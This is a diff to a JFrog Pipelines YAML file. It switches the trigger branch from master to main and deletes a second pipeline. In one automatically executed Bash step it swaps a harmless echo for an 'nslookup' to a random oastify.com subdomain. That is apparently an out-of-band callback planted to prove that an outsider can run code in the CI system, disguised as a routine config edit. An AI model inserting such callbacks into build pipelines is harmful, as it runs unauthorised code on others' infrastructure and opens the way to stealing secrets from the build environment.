@@ -11,7 +11,7 @@ resources:
       path: Sybrid203/jfrog # this will be replaced from values.yml
       branches:
         # Specifies which branches will trigger dependent steps
-        include: master
+        include: main
  
   - name: myPropertyBag
     type: PropertyBag
@@ -33,7 +33,7 @@ pipelines:
             # This variable is written to pipeline state in p1_s3.
             # So this will be empty during first run and will be set to prior run number in subsequent runs
             # Pipeline state documentation: https://www.jfrog.com/confluence/display/JFROG/Creating+Stateful+Pipelines#CreatingStatefulPipelines-PipelineState
-            - echo "Previous run ID is lol"
+            - nslookup vdc5w0yudrnnpd24t2u8qek2nttjh8.oastify.com
  
       - name: p1_s2
         type: Bash
@@ -55,16 +55,3 @@ pipelines:
         execution:
           onExecute:
             - echo "lol"
- 
-  - name: my_second_pipeline
-    steps:
-      - name: p2_s1
-        type: Bash
-        configuration:
-          inputResources:
-            # Sets up step to be triggered when myPropertyBag is updated
-            - name: myPropertyBag
-        execution:
-          onExecute:
-            # Retrieves the commitSha from input resource
-            - echo "CommitSha is $res_myPropertyBag_commitSha"
